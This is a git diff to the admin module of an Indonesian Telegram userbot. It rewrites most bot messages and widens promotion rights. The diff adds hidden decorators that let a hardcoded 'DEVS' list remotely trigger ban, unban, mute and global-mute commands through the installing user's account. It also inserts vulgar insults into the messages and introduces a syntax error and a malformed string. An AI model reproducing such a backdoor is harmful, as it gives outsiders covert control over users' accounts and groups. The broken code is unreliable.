@@ -129,15 +129,15 @@ async def promote(promt):
         return await promt.edit(NO_ADMIN)
 
     new_rights = ChatAdminRights(
-        add_admins=False,
+        add_admins=True,
         invite_users=True,
-        change_info=False,
+        change_info=True,
         ban_users=True,
         delete_messages=True,
         pin_messages=True,
     )
 
-    await promt.edit("`Promosikan Pengguna Sebagai Admin... Mohon Menunggu`")
+    await promt.edit("`Mempromosikan Pengguna Sebagai Admin Lord!😈`")
     user, rank = await get_user_from_event(promt)
     if not rank:
         rank = "Admin"  # Just in case.
@@ -147,7 +147,7 @@ async def promote(promt):
     # Try to promote if current user is admin or creator
     try:
         await promt.client(EditAdminRequest(promt.chat_id, user.id, new_rights, rank))
-        await promt.edit("`Berhasil Mempromosikan Pengguna Ini Sebagai Admin!`")
+        await promt.edit("**Berhasil Mempromosikan Pengguna Ini Sebagai Admin Lord!😈**")
         await sleep(5)
         await promt.delete()
 
@@ -178,7 +178,7 @@ async def demote(dmod):
         return await dmod.edit(NO_ADMIN)
 
     # If passing, declare that we're going to demote
-    await dmod.edit("`Sedang Melepas Admin...`")
+    await dmod.edit("`Sedang Melepas Admin Lord!😈`")
     rank = "Admin"  # dummy rank, lol.
     user = await get_user_from_event(dmod)
     user = user[0]
@@ -202,7 +202,7 @@ async def demote(dmod):
     # Assume we don't have permission to demote
     except BadRequestError:
         return await dmod.edit(NO_PERM)
-    await dmod.edit("`Admin Berhasil Dilepas!`")
+    await dmod.edit("**Berhasil Melepas Admin Lord!😈**")
     await sleep(5)
     await dmod.delete()
 
@@ -217,6 +217,7 @@ async def demote(dmod):
 
 
 @joo_cmd(pattern="ban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cban(?: |$)(.*)")
 async def ban(bon):
     # Here laying the sanity check
     chat = await bon.get_chat()
@@ -232,7 +233,7 @@ async def ban(bon):
         return
 
     # Announce that we're going to whack the pest
-    await bon.edit("`Melakukan Banned!`")
+    await bon.edit("**Sedang Memproses Banned Lord!😈**")
 
     try:
         await bon.client(EditBannedRequest(bon.chat_id, user.id, BANNED_RIGHTS))
@@ -252,11 +253,11 @@ async def ban(bon):
     # Shout out the ID, so that fedadmins can fban later
     if reason:
         await bon.edit(
-            f"`PENGGUNA:` [{user.first_name}](tg://user?id={user.id})\n`ID:` `{str(user.id)}` Telah Di Banned !!\n`Alasan:` {reason}"
+            f"`PENGGUNA:` [{user.first_name}](tg://user?id={user.id})\n`ID:` `{str(user.id)}` Telah Di Banned Lord!😈\n`Alasan:` {reason}"
         )
     else:
         await bon.edit(
-            f"`PENGGUNA:` [{user.first_name}](tg://user?id={user.id})\n`ID:` `{str(user.id)}` Si Jamet Telah Terbanned!"
+            f"`PENGGUNA:` [{user.first_name}](tg://user?id={user.id})\n`ID:` `{str(user.id)}` Si Kontol Telah Terbanned Lord!😈"
         )
     # Announce to the logging group if we have banned the person
     # successfully!
@@ -270,6 +271,7 @@ async def ban(bon):
 
 
 @joo_cmd(pattern="unban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunban(?: |$)(.*)")
 async def nothanos(unbon):
     # Here laying the sanity check
     chat = await unbon.get_chat()
@@ -281,7 +283,7 @@ async def nothanos(unbon):
         return await unbon.edit(NO_ADMIN)
 
     # If everything goes well...
-    await unbon.edit("**Sedang Melakukan Unban...**")
+    await unbon.edit("**Sedang Memproses Unbanned Lord!😈**")
 
     user = await get_user_from_event(unbon)
     user = user[0]
@@ -290,7 +292,7 @@ async def nothanos(unbon):
 
     try:
         await unbon.client(EditBannedRequest(unbon.chat_id, user.id, UNBAN_RIGHTS))
-        await unbon.edit("**Si Jamat Berhasil Di Unban**")
+        await unbon.edit("**Unbanned Berhasil Lord!😈**")
         await sleep(3)
         await unbon.delete()
 
@@ -302,10 +304,11 @@ async def nothanos(unbon):
                 f"GRUP: {unbon.chat.title}(`{unbon.chat_id}`)",
             )
     except UserIdInvalidError:
-        await unbon.edit("**Sepertinya Terjadi Kesalahan!**")
+        await unbon.edit("**Terjadi Kesalahan Lord!😈**")
 
 
 @joo_cmd(pattern="mute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cmute(?: |$)(.*)")
 async def spider(spdr):
     # Check if the function running under SQL mode
     try:
@@ -330,22 +333,22 @@ async def spider(spdr):
 
     if user.id == self_user.id:
         return await spdr.edit(
-            "`Tangan Terlalu Pendek, Tidak Bisa Membisukan Diri Sendiri...\n(ヘ･_･)ヘ┳━┳`"
+            "**Gausah Ngadi Ngadi Tolol!😈**"
         )
 
     # If everything goes well, do announcing and mute
-    await spdr.edit("`Telah Dibisukan!`")
+    await spdr.edit("**Si Kontol Berhasil Dibisukan Lord!😈**")
     if mute(spdr.chat_id, user.id) is False:
-        return await spdr.edit("`Error! Si Jamet Sudah Dibisukan.`")
+        return await spdr.edit("**Si Kontol Sudah Dibisukan Lord!😈")
     else:
         try:
             await spdr.client(EditBannedRequest(spdr.chat_id, user.id, MUTE_RIGHTS))
 
             # Announce that the function is done
             if reason:
-                await spdr.edit(f"**Telah Dibisukan!**\n**Alasan:** `{reason}`")
+                await spdr.edit(f"**Si Kontol Telah Dibisukan Lord!😈**")
             else:
-                await spdr.edit("**Si Jamet Telah Dibisukan!**")
+                await spdr.edit("**Berhasil Membisukan Lord!😈**")
 
             # Announce to logging group
             if BOTLOG:
@@ -356,10 +359,11 @@ async def spider(spdr):
                     f"GRUP: {spdr.chat.title}(`{spdr.chat_id}`)",
                 )
         except UserIdInvalidError:
-            return await spdr.edit("**Terjadi Kesalahan!**")
+            return await spdr.edit("**Terjadi Kesalahan Lord!😈**")
 
 
 @joo_cmd(pattern="unmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cunmute(?: |$)(.*)")
 async def unmoot(unmot):
     # Admin or creator check
     chat = await unmot.get_chat()
@@ -377,25 +381,25 @@ async def unmoot(unmot):
         return await unmot.edit(NO_SQL)
 
     # If admin or creator, inform the user and start unmuting
-    await unmot.edit("**Melakukan Unmute...**")
+    await unmot.edit("**Memproses Unmute Lord!**")
     user = await get_user_from_event(unmot)
     user = user[0]
     if not user:
         return
 
     if unmute(unmot.chat_id, user.id) is False:
-        return await unmot.edit("`Kesalahan! Pengguna Sudah Tidak Dibisukan.`")
+        return await unmot.edit("**Si Kontol Sudah Tidak Dibisukan Lord!😈**")
     else:
 
         try:
             await unmot.client(EditBannedRequest(unmot.chat_id, user.id, UNBAN_RIGHTS))
             await unmot.edit(
-                "```Berhasil Melakukan Unmute! Si Jamet Sudah Tidak Lagi Dibisukan```"
+                "```Berhasil Melakukan Unmute Lord!😈**"
             )
             await sleep(3)
             await unmot.delete()
         except UserIdInvalidError:
-            return await unmot.edit("**Terjadi Kesalahan!**")
+            return await unmot.edit("**Terjadi Kesalahan Lord!😈**")
 
         if BOTLOG:
             await unmot.client.send_message(
@@ -438,6 +442,7 @@ async def muter(moot):
 
 
 @joo_cmd(pattern="ungmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cungmute(?: |$)(.*)")
 async def ungmoot(un_gmute):
     # Admin or creator check
     chat = await un_gmute.get_chat()
@@ -460,13 +465,13 @@ async def ungmoot(un_gmute):
         return
 
     # If pass, inform and start ungmuting
-    await un_gmute.edit("```Membuka Global Mute Pengguna...```")
+    await un_gmute.edit("Membuka Global Mute Pengguna Lord!😈")
 
     if ungmute(user.id) is False:
-        await un_gmute.edit("**Kesalahan! Pengguna Sedang Tidak Di Gmute.**")
+        await un_gmute.edit("**Kesalahan! Pengguna Sudah Tidak Di Global Mute Lord!😈**")
     else:
         # Inform about success
-        await un_gmute.edit("**Berhasil! Pengguna Sudah Tidak Lagi Dibisukan**")
+        await un_gmute.edit("**Berhasil! Pengguna Sudah Tidak Lagi Dibisukan Lord!😈**")
         await sleep(3)
         await un_gmute.delete()
 
@@ -480,6 +485,7 @@ async def ungmoot(un_gmute):
 
 
 @joo_cmd(pattern="gmute(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgmute(?: |$)(.*)")
 async def gspider(gspdr):
     # Admin or creator check
     chat = await gspdr.get_chat()
@@ -501,14 +507,14 @@ async def gspider(gspdr):
         return
 
     # If pass, inform and start gmuting
-    await gspdr.edit("`Berhasil Membisukan Pengguna!`")
+    await gspdr.edit("`Berhasil Membisukan Pengguna Lord!😈`")
     if gmute(user.id) is False:
-        await gspdr.edit("**Kesalahan! Pengguna Sudah Dibisukan.**")
+        await gspdr.edit("**Kesalahan! Pengguna Sudah Dibisukan Lord!😈**")
     else:
         if reason:
             await gspdr.edit(f"**Dibisukan Secara Global!**\n**Alasan:** `{reason}`")
         else:
-            await gspdr.edit("**Berhasil Membisukan Pengguna Secara Global!**")
+            await gspdr.edit("**Berhasil Membisukan Pengguna Secara Global Lord!😈**")
 
         if BOTLOG:
             await gspdr.client.send_message(
@@ -524,7 +530,7 @@ async def rm_deletedacc(show):
 
     con = show.pattern_match.group(1).lower()
     del_u = 0
-    del_status = "`Tidak Menemukan Akun Terhapus, Grup Bersih`"
+    del_status = "`Tidak Menemukan Akun Terhapus, Grup Bersih Lord!`"
 
     if con != "clean":
         await show.edit("`Mencari Akun Hantu/Terhapus/Zombie...`")
@@ -547,9 +553,9 @@ async def rm_deletedacc(show):
 
     # Well
     if not admin and not creator:
-        return await show.edit("`Mohon Maaf, Bukan Admin Disini!`")
+        return await show.edit("`Mohon Maaf Lord, Anda Bukan Admin Disini!`")
 
-    await show.edit("`Menghapus Akun Terhapus...\nMohon Menunggu Sedang Dalam Proses`")
+    await show.edit("`Menghapus Akun Terhapus...\nMohon Menunggu Sedang Dalam Proses Lord!`")
     del_u = 0
     del_a = 0
 
@@ -560,7 +566,7 @@ async def rm_deletedacc(show):
                     EditBannedRequest(show.chat_id, user.id, BANNED_RIGHTS)
                 )
             except ChatAdminRequiredError:
-                return await show.edit("`Tidak Memiliki Izin Banned Dalam Grup Ini`")
+                return await show.edit("`Tidak Memiliki Izin Banned Dalam Grup Ini`!")
             except UserAdminInvalidError:
                 del_u -= 1
                 del_a += 1
@@ -568,12 +574,12 @@ async def rm_deletedacc(show):
             del_u += 1
 
     if del_u > 0:
-        del_status = f"`Membersihkan` **{del_u}** `Akun Terhapus`"
+        del_status = f"`Membersihkan` **{del_u}** `Akun Terhapus Lord!`"
 
     if del_a > 0:
         del_status = (
             f"Membersihkan **{del_u}** Akun Terhapus "
-            f"\n**{del_a}** `Admin Akun Terhapus Tidak Bisa Dihapus.`"
+            f"\n**{del_a}** `Admin Akun Terhapus Tidak Bisa Dihapus Lord!`"
         )
     await show.edit(del_status)
     await sleep(2)
@@ -621,7 +627,7 @@ async def pin(msg):
     to_pin = msg.reply_to_msg_id
 
     if not to_pin:
-        return await msg.edit("`Mohon Balas Ke Pesan Untuk Melakukan Pin.`")
+        return await msg.edit("`Mohon Balas Ke Pesan Untuk Melakukan Pin Lord!😈`")
 
     options = msg.pattern_match.group(1)
 
@@ -635,7 +641,7 @@ async def pin(msg):
     except BadRequestError:
         return await msg.edit(NO_PERM)
 
-    await msg.edit("`Berhasil Melakukan Pinned!`")
+    await msg.edit("`Berhasil Melakukan Pinned Lord!😈`")
     await sleep(2)
     await msg.delete()
 
@@ -666,21 +672,21 @@ async def kick(usr):
     if not user:
         return await usr.edit("`Tidak Dapat Menemukan Pengguna.`")
 
-    await usr.edit("`Melakukan Kick....`")
+    await usr.edit("`Melakukan Kick Lord!😈`")
 
     try:
         await usr.client.kick_participant(usr.chat_id, user.id)
         await sleep(0.5)
-    except Exception as e:
+    except Exception as e:! 
         return await usr.edit(NO_PERM + f"\n{str(e)}")
 
     if reason:
         await usr.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) **Telah Dikick Dari Grup**\n**Alasan:** `{reason}`"
+            f"[{user.first_name}](tg://user?id={user.id}) **Telah Dikick Dari Grup Lord!**\n**Alasan:** `{reason}`"
         )
     else:
         await usr.edit(
-            f"[{user.first_name}](tg://user?id={user.id}) **Telah Dikick Dari Grup**"
+            f"[{user.first_name}](tg://user?id={user.id}) **Telah Dikick Dari Grup Lord!**"
         )
         await sleep(5)
         await usr.delete()
@@ -725,7 +731,7 @@ async def get_users(show):
         await show.edit(mentions)
     except MessageTooLongError:
         await show.edit(
-            "Grup Ini Terlalu Besar Mengunggah Daftar Pengguna Sebagai File."
+            "**Grup Ini Terlalu Besar Mengunggah Daftar Pengguna Sebagai File Lord!**"
         )
         file = open("daftarpengguna.txt", "w+")
         file.write(mentions)
@@ -815,7 +821,7 @@ async def get_usersdel(show):
         await show.edit(mentions)
     except MessageTooLongError:
         await show.edit(
-            "Grup Ini Terlalu Besar, Mengunggah Daftar Akun Terhapus Sebagai File."
+            "**Grup Ini Terlalu Besar, Mengunggah Daftar Akun Terhapus Sebagai File Lord!**"
         )
         file = open("daftarpengguna.txt", "w+")
         file.write(mentions)
@@ -845,7 +851,7 @@ async def get_userdel_from_event(event):
             user = int(user)
 
         if not user:
-            return await event.edit("`Ketik username Atau Reply Ke Pengguna!`")
+            return await event.edit("`Ketik Username Atau Reply Ke Pengguna!`")
 
         if event.message.entities is not None:
             probable_user_mention_entity = event.message.entities[0]
@@ -900,7 +906,7 @@ async def get_bots(show):
         await show.edit(mentions, parse_mode="html")
     except MessageTooLongError:
         await show.edit(
-            "Terlalu Banyak Bot Di Grup Ini, Mengunggah Daftar Bot Sebagai File."
+            "**Terlalu Banyak Bot Di Grup Ini, Mengunggah Daftar Bot Sebagai File Lord!**"
         )
         file = open("botlist.txt", "w+")
         file.write(mentions)
